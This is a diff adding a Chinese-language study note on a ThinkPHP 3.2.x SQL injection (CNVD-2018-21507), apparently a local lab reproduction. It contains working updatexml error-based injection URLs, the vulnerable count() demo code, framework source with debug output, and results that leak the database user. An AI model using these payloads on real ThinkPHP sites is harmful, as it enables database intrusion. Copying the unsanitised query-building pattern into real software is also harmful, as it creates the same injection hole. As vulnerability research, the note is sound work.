@@ -726,3 +726,101 @@ array(1) {
 执行的SQL语句：
 SELECT * FROM `think_user` ORDER BY `account`  LIMIT 1  
 ```
+三、ThinkPHP <=3.2.4 SQL注入漏洞（CNVD-2018-21507）
+
+http://localhost/thinkphp-3.2.3/index.php/Home/Index/cntSql?amount=id),updatexml(1,concat(1,user(),1),1)from+user%23
+
+demo代码
+
+```
+public function cntSql()
+{
+    $amount = I('get.amount');
+    $num = M('user')->count($amount);
+    dump($num);
+    // 输出 SQL 语句
+    echo "<pre>执行的SQL语句：\n";
+    echo $user->getLastSql();
+    echo "</pre>";
+}
+```
+
+M('user')->count($amount); 触发到了 
+
+```
+/**
+     * 利用__call方法实现一些特殊的Model方法
+     * @access public
+     * @param string $method 方法名称
+     * @param array $args 调用参数
+     * @return mixed
+     */
+    public function __call($method, $args)
+    {
+		echo "<pre>调试输出：\n";
+		echo var_dump($method);
+		echo var_dump($args);
+		echo "</pre>";
+        if (in_array(strtolower($method), $this->methods, true)) {
+            // 连贯操作的实现
+            $this->options[strtolower($method)] = $args[0];
+            return $this;
+        } elseif (in_array(strtolower($method), array('count', 'sum', 'min', 'max', 'avg'), true)) {
+            // 统计查询的实现
+            $field = isset($args[0]) ? $args[0] : '*';
+            return $this->getField(strtoupper($method) . '(' . $field . ') AS tp_' . $method);
+        } elseif (strtolower(substr($method, 0, 5)) == 'getby') {
+            // 根据某个字段获取记录
+            $field         = parse_name(substr($method, 5));
+            $where[$field] = $args[0];
+            return $this->where($where)->find();
+        } elseif (strtolower(substr($method, 0, 10)) == 'getfieldby') {
+            // 根据某个字段获取记录的某个值
+            $name         = parse_name(substr($method, 10));
+            $where[$name] = $args[0];
+            return $this->where($where)->getField($args[1]);
+        } elseif (isset($this->_scope[$method])) {
+// 命名范围的单独调用支持
+            return $this->scope($method, $args[0]);
+        } else {
+            E(__CLASS__ . ':' . $method . L('_METHOD_NOT_EXIST_'));
+            return;
+        }
+    }
+```
+
+```
+elseif (in_array(strtolower($method), array('count', 'sum', 'min', 'max', 'avg'), true)) {
+            // 统计查询的实现
+            $field = isset($args[0]) ? $args[0] : '*';
+            return $this->getField(strtoupper($method) . '(' . $field . ') AS tp_' . $method);
+}
+这里已经拼接了sql语句进去了，然后通过$this->getField('count(id),updatexml(1,concat(1,user(),1),1)from user#) AS tp_count')
+
+调试输出：
+string(5) "count"
+array(1) {
+  [0]=>
+  string(47) "id),updatexml(1,concat(1,user(),1),1)from user#"
+}
+```
+
+
+
+http://localhost/thinkphp-3.2.3/index.php/Home/Index/cntSql?amount=id),updatexml(1,concat(1,user(),1),1)from+think_user%23
+
+```
+调试输出：
+string(5) "count"
+array(1) {
+  [0]=>
+  string(53) "id),updatexml(1,concat(1,user(),1),1)from think_user#"
+}
+初始传入的 fields: string(72) "COUNT(id),updatexml(1,concat(1,user(),1),1)from think_user#) AS tp_count" 字段是字符串，进行 explode: array(6) { [0]=> string(9) "COUNT(id)" [1]=> string(11) "updatexml(1" [2]=> string(8) "concat(1" [3]=> string(6) "user()" [4]=> string(2) "1)" [5]=> string(31) "1)from think_user#) AS tp_count" } 字段是数组，开始解析: 普通字段：COUNT(id) 普通字段：updatexml(1 普通字段：concat(1 普通字段：user() 普通字段：1) 普通字段：1)from think_user#) AS tp_count 最终拼接结果: string(72) "COUNT(id),updatexml(1,concat(1,user(),1),1)from think_user#) AS tp_count"
+输入参数:
+string(0) ""
+:(
+
+1105:XPATH syntax error: 'root@localhost1' [ SQL语句 ] : SELECT COUNT(id),updatexml(1,concat(1,user(),1),1)from think_user#) AS tp_count FROM `think_user`
+```
+
